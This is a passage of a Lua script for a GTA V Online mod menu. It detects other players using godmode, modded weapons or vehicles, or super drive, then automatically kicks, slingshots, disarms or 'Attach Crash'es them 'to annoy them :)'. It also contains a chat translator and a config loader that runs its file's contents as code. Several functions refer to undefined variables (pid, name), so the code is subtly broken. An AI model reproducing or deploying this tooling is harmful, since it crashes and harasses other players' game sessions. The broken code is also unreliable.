            if (players.is_godmode(pid) or not ENTITY.GET_ENTITY_CAN_BE_DAMAGED(ped)) and not NETWORK.NETWORK_IS_PLAYER_FADING(pid) and ENTITY.IS_ENTITY_VISIBLE(ped) and get_transition_state(pid) ~= 0 and get_interior_player_is_in(pid) == interior then
                util.draw_debug_text(players.get_name(pid) .. " Is In Godmode")
                break
            end
        end
    end 
end)

menu.toggle_loop(gdmedits, "Godmode Auto Kick", {}, "Detects if someone is using godmode, blocks there joins and breakup kicks them.", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        for i, interior in ipairs(interior_stuff) do
            if (players.is_godmode(pid) or not ENTITY.GET_ENTITY_CAN_BE_DAMAGED(ped)) and not NETWORK.NETWORK_IS_PLAYER_FADING(pid) and ENTITY.IS_ENTITY_VISIBLE(ped) and get_transition_state(pid) ~= 0 and get_interior_player_is_in(pid) == interior then
            menu.trigger_commands("blast" .. players.get_name(pid))
                util.draw_debug_text(players.get_name(pid) .. " Is In Godmode")
                util.toast(players.get_name(pid) .. "Is In Godmode")
                break
            end
        end
    end 
end)

local vehgdm = menu.list(detections, "Vehicle Godmode", {}, "")
menu.toggle_loop(vehgdm, "Vehicle Godmode", {}, "Detects if someone is using a vehicle that is in godmode.", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        local player_veh = PED.GET_VEHICLE_PED_IS_USING(ped)
        if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            for i, interior in ipairs(interior_stuff) do
                if not ENTITY.GET_ENTITY_CAN_BE_DAMAGED(player_veh) and not NETWORK.NETWORK_IS_PLAYER_FADING(pid) and ENTITY.IS_ENTITY_VISIBLE(ped) and get_transition_state(pid) ~= 0 and get_interior_player_is_in(pid) == interior then
                    util.draw_debug_text(players.get_name(pid) .. "  Is In Vehicle Godmode")
                    break
                end
            end
        end
    end 
end)

menu.toggle_loop(vehgdm, "Vehicle Godmode Auto Kick", {}, "Detects if someone is using a vehicle that is in godmode, blocks there joins and breakup kicks them.", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        local player_veh = PED.GET_VEHICLE_PED_IS_USING(ped)
        if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            for i, interior in ipairs(interior_stuff) do
                if not ENTITY.GET_ENTITY_CAN_BE_DAMAGED(player_veh) and not NETWORK.NETWORK_IS_PLAYER_FADING(pid) and ENTITY.IS_ENTITY_VISIBLE(ped) and get_transition_state(pid) ~= 0 and get_interior_player_is_in(pid) == interior then
                menu.trigger_commands("blast" .. players.get_name(pid))
                    util.draw_debug_text(players.get_name(pid) .. "Is In Vehicle Godmode")
                    util.toast(players.get_name(pid) .. "Is In Vehicle Godmode")
                    break
                end
            end
        end
    end 
end)

menu.toggle_loop(vehgdm, "Vehicle Godmode Auto Slingshot", {}, "Detects if someone is using a vehicle that is in godmode, then slingshots there vehicle.", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        local player_veh = PED.GET_VEHICLE_PED_IS_USING(ped)
        if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            for i, interior in ipairs(interior_stuff) do
                if not ENTITY.GET_ENTITY_CAN_BE_DAMAGED(player_veh) and not NETWORK.NETWORK_IS_PLAYER_FADING(pid) and ENTITY.IS_ENTITY_VISIBLE(ped) and get_transition_state(pid) ~= 0 and get_interior_player_is_in(pid) == interior then
                menu.trigger_commands("slingshot" .. players.get_name(pid))
                    util.draw_debug_text(players.get_name(pid) .. "Is In Vehicle Godmode")
                    util.toast(players.get_name(pid) .. "Is In Vehicle Godmode")
                    break
                end
            end
        end
    end 
end)

menu.toggle_loop(vehgdm, "Vehicle Godmode Auto Kick Them Out", {}, "Detects if someone is using a vehicle that is in godmode, then kicks them out of the vehicle.", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        local player_veh = PED.GET_VEHICLE_PED_IS_USING(ped)
        if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            for i, interior in ipairs(interior_stuff) do
                if not ENTITY.GET_ENTITY_CAN_BE_DAMAGED(player_veh) and not NETWORK.NETWORK_IS_PLAYER_FADING(pid) and ENTITY.IS_ENTITY_VISIBLE(ped) and get_transition_state(pid) ~= 0 and get_interior_player_is_in(pid) == interior then
                menu.trigger_commands("vehkick" .. players.get_name(pid))
                    util.draw_debug_text(players.get_name(pid) .. "Is In Vehicle Godmode")
                    util.toast(players.get_name(pid) .. "Is In Vehicle Godmode")
                    break
                end
            end
        end
    end 
end)

local unrelveh = menu.list(detections, "Unreleased Vehicle", {}, "")
menu.toggle_loop(unrelveh, "Unreleased Vehicle", {}, "Detects if someone is using a vehicle that has not been released yet.", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        local modelHash = players.get_vehicle_model(pid)
        for i, name in ipairs(unreleased_vehicles) do
            if modelHash == util.joaat(name) then
                util.draw_debug_text(players.get_name(pid) .. " Is Driving An Unreleased Vehicle " .. "(" .. name .. ")")
            end
        end
    end
end)

menu.toggle_loop(unrelveh, "Unreleased Vehicle Auto Kick", {}, "Detects if someone is using a vehicle that has not been released yet, blocks there joins and buttplug kicks them.", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        local modelHash = players.get_vehicle_model(pid)
        for i, name in ipairs(unreleased_vehicles) do
            if modelHash == util.joaat(name) then
                menu.trigger_commands("blast" .. players.get_name(pid))
                util.draw_debug_text(players.get_name(pid) .. " Is Driving An Unreleased Vehicle " .. "(" .. name .. ")")
                util.toast(players.get_name(pid) .. " Is Driving An Unreleased Vehicle" .. "(" .. name .. ")")
            end
        end
    end
end)

menu.toggle_loop(unrelveh, "Unreleased Car Auto Slingshot", {}, "Detects if someone is using a vehicle that has not been released yet, then slingshots there vehicle.", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        local modelHash = players.get_vehicle_model(pid)
        for i, name in ipairs(unreleased_vehicles) do
            if modelHash == util.joaat(name) then
                menu.trigger_commands("slingshot" .. players.get_name(pid))
                util.draw_debug_text(players.get_name(pid) .. " Is Driving An Unreleased Vehicle " .. "(" .. name .. ")")
                util.toast(players.get_name(pid) .. " Is Driving An Unreleased Vehicle" .. "(" .. name .. ")")
            end
        end
    end
end)

menu.toggle_loop(unrelveh, "Unreleased Car Auto Kick Them Out", {}, "Detects if someone is using a vehicle that has not been released yet, then Kicks them out.", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        local modelHash = players.get_vehicle_model(pid)
        for i, name in ipairs(unreleased_vehicles) do
            if modelHash == util.joaat(name) then
                menu.trigger_commands("vehkick" .. players.get_name(pid))
                util.draw_debug_text(players.get_name(pid) .. " Is Driving An Unreleased Vehicle " .. "(" .. name .. ")")
                util.toast(players.get_name(pid) .. " Is Driving An Unreleased Vehicle" .. "(" .. name .. ")")
            end
        end
    end
end)

local modhack = menu.list(detections, "It's a hacker", {}, "")
menu.toggle_loop(modhack, "It's a hacker", {}, "Detects if the player is about to ban", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local reason = NETWORK.NETWORK_PLAYER_GET_CHEATER_REASON(player_id)
        if NETWORK.NETWORK_PLAYER_IS_CHEATER(player_id) then
            util.draw_debug_text(players.get_name(player_id) .. " They are about to ban him :u, reason:", reason)
                util.toast(players.get_name(pid) .. " Is a hacker!" .. "(" .. name .. ")")
            break
        end
    end
end)

menu.toggle_loop(modhack, "It's a hacker Auto Kick", {}, "Detects if the player is about to ban, blocks there joins and buttplug kicks them.", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local reason = NETWORK.NETWORK_PLAYER_GET_CHEATER_REASON(player_id)
        if NETWORK.NETWORK_PLAYER_IS_CHEATER(player_id) then
                menu.trigger_commands("blast" .. players.get_name(pid))
            util.draw_debug_text(players.get_name(player_id) .. " They are about to ban him :u, reason:", reason)
                util.toast(players.get_name(pid) .. " Is a hacker is being kicked now!" .. "(" .. name .. ")")
            break
        end
    end
end)

menu.toggle_loop(modhack, "It's a hacker Auto Crash", {}, "Detects if the player is about to banned, then blocks there joins and sends Attach Crash to annoy them :).", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local reason = NETWORK.NETWORK_PLAYER_GET_CHEATER_REASON(player_id)
        if NETWORK.NETWORK_PLAYER_IS_CHEATER(player_id) then
                menu.trigger_commands("attachcrash" .. players.get_name(pid))
                menu.trigger_commands("historyblock" .. players.get_name(pid))
            util.draw_debug_text(players.get_name(player_id) .. " They are about to ban him :u, reason:", reason)
                util.toast(players.get_name(pid) .. " Is a hacker and is being Attach Crashed!" .. "(" .. name .. ")")
            break
        end
    end
end)


local modweps = menu.list(detections, "Weapon In Interior", {}, "")
menu.toggle_loop(modweps, "Weapon In Interior", {}, "Detects if you use a gun indoors", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        if players.is_in_interior(player_id) and WEAPON.IS_PED_ARMED(player, 7) then
            util.draw_debug_text(players.get_name(player_id) .. " Has a gun indoors")
            break
        end
    end
end)

menu.toggle_loop(modweps, "Weapon In Interior Auto Kick", {}, "Detects if you use a gun indoors, then blocks there joins and buttplug kicks them.", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        if players.is_in_interior(player_id) and WEAPON.IS_PED_ARMED(player, 7) then
                menu.trigger_commands("blast" .. players.get_name(pid))
            util.draw_debug_text(players.get_name(player_id) .. " Has a gun indoors")
                util.toast(players.get_name(pid) .. " Weapon In Interior Auto Kicking..." .. "(" .. name .. ")")
            break
        end
    end
end)

menu.toggle_loop(modweps, "Weapon In Interior Auto Disarm", {}, "Detects if you use a gun indoors, then disarms them.", function()
    for _, player_id in ipairs(players.list(false, true, true)) do
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        if players.is_in_interior(player_id) and WEAPON.IS_PED_ARMED(player, 7) then
                menu.trigger_commands("disarm" .. players.get_name(pid))
            util.draw_debug_text(players.get_name(player_id) .. " Has a gun indoors")
                util.toast(players.get_name(pid) .. " Weapon In Interior Auto Kicking..." .. "(" .. name .. ")")
            break
        end
    end
end)


local modwep = menu.list(detections, "Modded Weapon", {}, "")
menu.toggle_loop(modwep, "Modded Weapon", {}, "Detects if someone is using a weapon that can not be obtained in online.", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        for i, hash in ipairs(modded_weapons) do
            local weapon_hash = util.joaat(hash)
            if WEAPON.HAS_PED_GOT_WEAPON(ped, weapon_hash, false) and (WEAPON.IS_PED_ARMED(ped, 7) or TASK.GET_IS_TASK_ACTIVE(ped, 8) or TASK.GET_IS_TASK_ACTIVE(ped, 9)) then
                util.draw_debug_text(players.get_name(pid) .. " Is Using A Modded Weapon" .. "(" .. hash .. ")")
                break
            end
        end
    end
end)

menu.toggle_loop(modwep, "Modded Weapon Auto Kick", {}, "Detects if someone is using a weapon that can not be obtained in online, blocks there joins and buttplug kicks them.", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        for i, hash in ipairs(modded_weapons) do
            local weapon_hash = util.joaat(hash)
            if WEAPON.HAS_PED_GOT_WEAPON(ped, weapon_hash, false) and (WEAPON.IS_PED_ARMED(ped, 7) or TASK.GET_IS_TASK_ACTIVE(ped, 8) or TASK.GET_IS_TASK_ACTIVE(ped, 9)) then
                menu.trigger_commands("blast" .. players.get_name(pid))
                util.draw_debug_text(players.get_name(pid) .. " Is Using A Modded Weapon" .. "(" .. hash .. ")")
                util.toast(players.get_name(pid) .. " Is Using A Modded Weapon" .. "(" .. hash .. ")")
                break
            end
        end
    end
end)

menu.toggle_loop(modwep, "Modded Weapon Auto Disarm", {}, "Detects if someone is using a weapon that can not be obtained in online, then disarms them.", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        for i, hash in ipairs(modded_weapons) do
            local weapon_hash = util.joaat(hash)
            if WEAPON.HAS_PED_GOT_WEAPON(ped, weapon_hash, false) and (WEAPON.IS_PED_ARMED(ped, 7) or TASK.GET_IS_TASK_ACTIVE(ped, 8) or TASK.GET_IS_TASK_ACTIVE(ped, 9)) then
                menu.trigger_commands("disarm" .. players.get_name(pid))
                util.draw_debug_text(players.get_name(pid) .. " Is Using A Modded Weapon" .. "(" .. hash .. ")")
                util.toast(players.get_name(pid) .. " Is Using A Modded Weapon" .. "(" .. hash .. ")")
                break
            end
        end
    end
end)

local modveh = menu.list(detections, "Modded Vehicle", {}, "")
menu.toggle_loop(modveh, "Modded Vehicle", {}, "Detects if someone is using a vehicle that can not be obtained in online.", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        local modelHash = players.get_vehicle_model(pid)
        for i, name in ipairs(modded_vehicles) do
            if modelHash == util.joaat(name) then
                util.draw_debug_text(players.get_name(pid) .. " Is Driving A Modded Vehicle" .. "(" .. name .. ")")
                break
            end
        end
    end
end)

menu.toggle_loop(modveh, "Modded Vehicle Auto Kick", {}, "Detects if someone is using a vehicle that can not be obtained in online, blocks there joins and buttplug kicks them.", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        local modelHash = players.get_vehicle_model(pid)
        for i, name in ipairs(modded_vehicles) do
            if modelHash == util.joaat(name) then
                menu.trigger_commands("blast" .. players.get_name(pid))
                util.draw_debug_text(players.get_name(pid) .. " Is Driving A Modded Vehicle" .. "(" .. name .. ")")
                util.toast(players.get_name(pid) .. " Is Driving A Modded Vehicle" .. "(" .. name .. ")")
                break
            end
        end
    end
end)

menu.toggle_loop(modveh, "Modded Vehicle Auto Slingshot", {}, "Detects if someone is using a vehicle that can not be obtained in online, then slingshots vehicle.", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        local modelHash = players.get_vehicle_model(pid)
        for i, name in ipairs(modded_vehicles) do
            if modelHash == util.joaat(name) then
                menu.trigger_commands("slingshot" .. players.get_name(pid))
                util.draw_debug_text(players.get_name(pid) .. " Is Driving A Modded Vehicle" .. "(" .. name .. ")")
                util.toast(players.get_name(pid) .. " Is Driving A Modded Vehicle" .. "(" .. name .. ")")
                break
            end
        end
    end
end)

menu.toggle_loop(modveh, "Modded Vehicle Auto Kick Them Out", {}, "Detects if someone is using a vehicle that can not be obtained in online, then kicks them out of the vehicle.", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        local modelHash = players.get_vehicle_model(pid)
        for i, name in ipairs(modded_vehicles) do
            if modelHash == util.joaat(name) then
                menu.trigger_commands("vehkick" .. players.get_name(pid))
                util.draw_debug_text(players.get_name(pid) .. " Is Driving A Modded Vehicle" .. "(" .. name .. ")")
                util.toast(players.get_name(pid) .. " Is Driving A Modded Vehicle" .. "(" .. name .. ")")
                break
            end
        end
    end
end)


local detsuperd = menu.list(detections, "Super Drive", {}, "")
menu.toggle_loop(detsuperd, "Super Drive", {}, "Detects if the player is using super drive.", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local vehicle = PED.GET_VEHICLE_PED_IS_USING(ped)
        local veh_speed = (ENTITY.GET_ENTITY_SPEED(vehicle)* 2.236936)
        local class = VEHICLE.GET_VEHICLE_CLASS(vehicle)
        if class ~= 15 and class ~= 16 and veh_speed >= 180 and VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, -1) and players.get_vehicle_model(pid) ~= util.joaat("oppressor") then -- not checking opressor mk1 cus its stinky
        util.draw_debug_text(players.get_name(pid) .. " Is Using Super Drive")
            break
        end
    end
end)

menu.toggle_loop(detsuperd, "Super Drive Auto Kick", {}, "Detects if the player is using super drive, blocks there joins and buttplug kicks them.", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local vehicle = PED.GET_VEHICLE_PED_IS_USING(ped)
        local veh_speed = (ENTITY.GET_ENTITY_SPEED(vehicle)* 2.236936)
        local class = VEHICLE.GET_VEHICLE_CLASS(vehicle)
        if class ~= 15 and class ~= 16 and veh_speed >= 180 and VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, -1) and players.get_vehicle_model(pid) ~= util.joaat("oppressor") then -- not checking opressor mk1 cus its stinky
        menu.trigger_commands("blast" .. players.get_name(pid))
        util.draw_debug_text(players.get_name(pid) .. " Is Using Super Drive")
            util.toast(players.get_name(pid) .. " Is Using Super Drive")
            break
        end
    end
end)

menu.toggle_loop(detsuperd, "Super Drive Auto Slingshot", {}, "Detects if the player is using super drive, then slinghsots there vehicle.", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local vehicle = PED.GET_VEHICLE_PED_IS_USING(ped)
        local veh_speed = (ENTITY.GET_ENTITY_SPEED(vehicle)* 2.236936)
        local class = VEHICLE.GET_VEHICLE_CLASS(vehicle)
        if class ~= 15 and class ~= 16 and veh_speed >= 180 and VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, -1) and players.get_vehicle_model(pid) ~= util.joaat("oppressor") then -- not checking opressor mk1 cus its stinky
        menu.trigger_commands("slingshot" .. players.get_name(pid))
        util.draw_debug_text(players.get_name(pid) .. " Is Using Super Drive")
            util.toast(players.get_name(pid) .. " Is Using Super Drive")
            break
        end
    end
end)

menu.toggle_loop(detsuperd, "Super Drive Auto Kick Them Out", {}, "Detects if the player is using super drive, then kicks them out of the vehicle.", function()
    for _, pid in ipairs(players.list(false, true, true)) do
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local vehicle = PED.GET_VEHICLE_PED_IS_USING(ped)
        local veh_speed = (ENTITY.GET_ENTITY_SPEED(vehicle)* 2.236936)
        local class = VEHICLE.GET_VEHICLE_CLASS(vehicle)
        if class ~= 15 and class ~= 16 and veh_speed >= 180 and VEHICLE.GET_PED_IN_VEHICLE_SEAT(vehicle, -1) and players.get_vehicle_model(pid) ~= util.joaat("oppressor") then -- not checking opressor mk1 cus its stinky
        menu.trigger_commands("vehkick" .. players.get_name(pid))
        util.draw_debug_text(players.get_name(pid) .. " Is Using Super Drive")
            util.toast(players.get_name(pid) .. " Is Using Super Drive")
            break
        end
    end
end)

--------------------------------------

menu.action(menu.my_root(), "Yeet", {"ye"}, "Instantly sending yourself to desktop.", function()
    local curcar = entities.get_user_vehicle_as_handle(entities.get_all_objects_as_handles())
    if curcar then
    menu.trigger_commands("deletevehicle")
    util.yield(100)
    ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(curcar, 1, 0, 0, - 0.5, 0, true, true, true, true)
    end
end)

menu.action(menu.my_root(), "Restart GTA V", {"restartgta"}, "Restarts your game, closes it Online. You will need to reinject (duh).", function(on_click)
    MISC.RESTART_GAME("E574A662ACAEFBB1")
    util.yield(3000)
    menu.trigger_commands("ye")
    menu.trigger_commands("yeet")
end)

menu.action(menu.my_root(), "Yeet Roulette", {"yeetroulette"}, "Take a chance by instantly sending yourself to desktop or use the Restart GTA V Option.", function()
    local pick = math.random(6)
    if pick == 4 then 
        util.log("You loose.")
        menu.show_command_box("say " .. "I loose.")
        PAD.SET_CONTROL_VALUE_NEXT_FRAME(2, 201, 1.0)
        util.yield(200)
        PAD.SET_CONTROL_VALUE_NEXT_FRAME(2, 201, 1.0)
        menu.trigger_commands("ye")
    else
        util.toast("Lucky Bastard ;)")
		menu.show_command_box("say " .. "I got lucky.")
        PAD.SET_CONTROL_VALUE_NEXT_FRAME(2, 201, 1.0)
        util.yield(200)
        PAD.SET_CONTROL_VALUE_NEXT_FRAME(2, 201, 1.0)
    end
end, nil, nil, COMMANDPERM_AGGRESSIVE)

menu.action(menu.my_root(), "Restart Script", {"restartaddictlua"}, "Restarts the script to check for updates. Or you may prefer it on hotkey to make it the first script in players list making spectate option faster to find.", function ()
    util.restart_script()
end)

focusref = {}
isfocused = false
selectedcolormenu = 0
colorselec = 1
allchatlabel = util.get_label_text("MP_CHAT_ALL")
teamchatlabel = util.get_label_text("MP_CHAT_TEAM")

function save()
	configfile = io.open(filesystem.store_dir().."chat_translator//config.txt", "w+")
	configfile:write("colorselec = "..colorselec..string.char(10)..'teamchatlabel = "'..teamchatlabel..'"'..string.char(10)..'allchatlabel = "'..allchatlabel..'"')
	configfile:close()
end


if not filesystem.exists(filesystem.store_dir().."chat_translator//config.txt") then
	filesystem.mkdir(filesystem.store_dir().."chat_translator//")
	configfile = io.open(filesystem.store_dir().."chat_translator//config.txt", "w+")
	configfile:write("colorselec = "..colorselec..string.char(10)..'teamchatlabel = "'..util.get_label_text("MP_CHAT_TEAM")..'"'..string.char(10)..'allchatlabel = "'..util.get_label_text("MP_CHAT_ALL")..'"')
	configfile:close()
	colorselec = 1
else
	configfile = io.open(filesystem.store_dir().."chat_translator//config.txt")
	configfiledata = configfile:read("*all")
	configfile:close()
	load(configfiledata)()
end
util.ensure_package_is_installed("lua/ScaleformLib")
local sfchat = require("lib.ScaleformLib")("multiplayer_chat")
sfchat:draw_fullscreen()

local Languages = {
	{ Name = "Afrikaans", Key = "af" },
	{ Name = "Albanian", Key = "sq" },
	{ Name = "Arabic", Key = "ar" },
	{ Name = "Azerbaijani", Key = "az" },
	{ Name = "Basque", Key = "eu" },
	{ Name = "Belarusian", Key = "be" },
	{ Name = "Bengali", Key = "bn" },
	{ Name = "Bulgarian", Key = "bg" },
	{ Name = "Catalan", Key = "ca" },
	{ Name = "Chinese Simplified", Key = "zh-cn" },
	{ Name = "Chinese Traditional", Key = "zh-tw" },
	{ Name = "Croatian", Key = "hr" },
	{ Name = "Czech", Key = "cs" },
	{ Name = "Danish", Key = "da" },
	{ Name = "Dutch", Key = "nl" },
	{ Name = "English", Key = "en" },
	{ Name = "Esperanto", Key = "eo" },
	{ Name = "Estonian", Key = "et" },
	{ Name = "Filipino", Key = "tl" },
	{ Name = "Finnish", Key = "fi" },
	{ Name = "French", Key = "fr" },
	{ Name = "Galician", Key = "gl" },
	{ Name = "Georgian", Key = "ka" },
	{ Name = "German", Key = "de" },
	{ Name = "Greek", Key = "el" },
	{ Name = "Gujarati", Key = "gu" },
	{ Name = "Haitian Creole", Key = "ht" },
	{ Name = "Hebrew", Key = "iw" },
	{ Name = "Hindi", Key = "hi" },
	{ Name = "Hungarian", Key = "hu" },
	{ Name = "Icelandic", Key = "is" },
	{ Name = "Indonesian", Key = "id" },
	{ Name = "Irish", Key = "ga" },
	{ Name = "Italian", Key = "it" },
	{ Name = "Japanese", Key = "ja" },
	{ Name = "Kannada", Key = "kn" },
	{ Name = "Korean", Key = "ko" },
	{ Name = "Latin", Key = "la" },
	{ Name = "Latvian", Key = "lv" },
	{ Name = "Lithuanian", Key = "lt" },
	{ Name = "Macedonian", Key = "mk" },
	{ Name = "Malay", Key = "ms" },
	{ Name = "Maltese", Key = "mt" },
	{ Name = "Norwegian", Key = "no" },
	{ Name = "Persian", Key = "fa" },
	{ Name = "Polish", Key = "pl" },
	{ Name = "Portuguese", Key = "pt" },
	{ Name = "Romanian", Key = "ro" },
	{ Name = "Russian", Key = "ru" },
	{ Name = "Serbian", Key = "sr" },
	{ Name = "Slovak", Key = "sk" },
	{ Name = "Slovenian", Key = "sl" },
	{ Name = "Spanish", Key = "es" },
	{ Name = "Swahili", Key = "sw" },
	{ Name = "Swedish", Key = "sv" },
	{ Name = "Tamil", Key = "ta" },
	{ Name = "Telugu", Key = "te" },
	{ Name = "Thai", Key = "th" },
	{ Name = "Turkish", Key = "tr" },
	{ Name = "Ukrainian", Key = "uk" },
	{ Name = "Urdu", Key = "ur" },
	{ Name = "Vietnamese", Key = "vi" },
	{ Name = "Welsh", Key = "cy" },
	{ Name = "Yiddish", Key = "yi" },
}


local LangKeys = {}
local LangName = {}
local LangIndexes = {}
local LangLookupByName = {}
local LangLookupByKey = {}
local PlayerSpooflist = {}
local PlayerSpoof = {}

for i=1,#Languages do
	local Language = Languages[i]
	LangKeys[i] = Language.Name
	LangName[i] = Language.Name
	LangIndexes[Language.Key] = i
	LangLookupByName[Language.Name] = Language.Key
	LangLookupByKey[Language.Key] = Language.Name
end

table.sort(LangKeys)

function encode(text)
	return string.gsub(text, "%s", "+")
end
function decode(text)
	return string.gsub(text, "%+", " ")
end


local maxpl = menu.list(protex, "Max Players To 32")

menu.slider(maxpl, "Max Players To 32", {"maxplayers"}, "Set the maximum number of players in a session (only works when you are the host)", 1, 32, 32, 1, function (value)
    if Stand_internal_script_can_run then
        NETWORK.NETWORK_SESSION_SET_MATCHMAKING_GROUP_MAX(0, value)
       util.toast("Slots are now free :)")
    end
end)

menu.slider(maxpl, "Max Spectators", {"maxSpectators"}, "Set the maximum number of observers (only works when you are the host)", 0, 2, 2, 1, function (value)
    if Stand_internal_script_can_run then
        NETWORK.NETWORK_SESSION_SET_MATCHMAKING_GROUP_MAX(4, value)
        util.toast("Slots are now free :)")
    end
end)

menu.toggle(protex, "Mental State On/Off", {}, "", function(on_toggle)
if on_toggle then
    menu.trigger_commands("mentalstate" .. " 100")
else
    menu.trigger_commands("mentalstate" .. " 0")
    end
end)

local chat_trans = menu.list(protex, "Chat Translator")

settingtrad = menu.list(chat_trans, "Settings for traduction")
colortradtrad = menu.list(chat_trans, "PLayer name color")
menu.on_focus(colortradtrad, function()
	util.yield(50)
	isfocused = false
end)
selectmenu = menu.action(colortradtrad, "Selectioned : ".."Color : "..colorselec, {}, "this will be saved to a config file", function()
	menu.focus(focusref[tonumber(colorselec)])
end)
menu.on_focus(selectmenu, function()
	util.yield(50)
	isfocused = false
end)
for i = 1, 234 do
	focusref[i] = menu.action(colortradtrad, "Color : "..i, {}, "this will be saved to a config file", function() 
		menu.set_menu_name(selectmenu, "Selectioned : ".."Color : "..i)
		colorselec = i
		save()
	end)
	menu.on_focus(focusref[i], function()
		isfocused = false
		util.yield(50)
		isfocused = true
		while isfocused do
			if not menu.is_open() then
				isfocused = false
			end
			ptr1 = memory.alloc()
			ptr2 = memory.alloc()
			ptr3 = memory.alloc()
			ptr4 = memory.alloc()
			HUD.GET_HUD_COLOUR(i, ptr1, ptr2, ptr3, ptr4)
			directx.draw_text(0.5, 0.5, "exemple", 5, 0.75, {r = memory.read_int(ptr1)/255, g = memory.read_int(ptr2)/255, b =memory.read_int(ptr3)/255, a= memory.read_int(ptr4)/255}, true)
			util.yield()
		end
	end)
end


menu.text_input(settingtrad, "Custom label for ["..string.upper(util.get_label_text("MP_CHAT_TEAM")).."] translation message", {"labelteam"}, "leaving it blank will revert it to the original label", function(s, click_type)
	if (s == "") then
		teamchatlabel = util.get_label_text("MP_CHAT_TEAM")
	else
		teamchatlabel = s 
	end
	if not (click_type == 4) then
		save()
	end
end)
if not (teamchatlabel == util.get_label_text("MP_CHAT_TEAM")) then
	menu.trigger_commands("labelteam "..teamchatlabel)
end


menu.text_input(settingtrad, "Custom label for ["..string.upper(util.get_label_text("MP_CHAT_ALL")).."] translation message", {"labelall"}, "leaving it blank will revert it to the original label", function(s, click_type)
	if (s == "") then
		allchatlabel = util.get_label_text("MP_CHAT_ALL")
	else
		allchatlabel = s 
	end
	if not (click_type == 4) then
		save()
	end
end)
if not (teamchatlabel == util.get_label_text("MP_CHAT_TEAM")) then
	menu.trigger_commands("labelall "..allchatlabel)
end

targetlangmenu = menu.slider_text(chat_trans, "Target Language", {}, "You need to click to aply change", LangName, function(s)
	targetlang = LangLookupByName[LangKeys[s]]
end)

tradlocamenu = menu.slider_text(settingtrad, "Location of Traducted Message", {}, "You need to click to aply change", {"Global Chat networked", "Global Chat not networked", "Team Chat not networked", "Team Chat networked", "--notification"}, function(s)
	Tradloca = s
end)
	
traductself = false
menu.toggle(settingtrad, "Traduct Yourself", {}, "", function(on)
	traductself = on	
end)
traductsamelang = false
menu.toggle(settingtrad, "Traduct even if the language is the same as the desired one", {}, "might not work correctly because google is dumb", function(on)
	traductsamelang = on	
end)
oldway = false
menu.toggle(settingtrad, "Use the old method", {}, players.get_name(players.user()).." [ALL] player_sender : their message", function(on)
	oldway = on	
end)
traduct = false
menu.toggle(chat_trans, "Translator On/Off", {}, "", function(on)
	traduct = on
end, false)

traductmymessage = menu.list(chat_trans, "Send Traducted message")
finallangmenu = menu.slider_text(traductmymessage, "Final Language", {"finallang"}, "Final Languge of your message.																	  You need to click to aply change", LangName, function(s)
   targetlangmessagesend = LangLookupByName[LangKeys[s]]
end)

menu.action(traductmymessage, "Send Message", {"Sendmessage"}, "Input the text For your message", function(on_click)
    util.toast("Please input your message")
    menu.show_command_box("Sendmessage ")
end, function(on_command)
    mytext = on_command
    async_http.init("translate.googleapis.com", "/translate_a/single?client=gtx&sl=auto&tl="..targetlangmessagesend.."&dt=t&q="..encode(mytext), function(Sucess)
		if Sucess ~= "" then
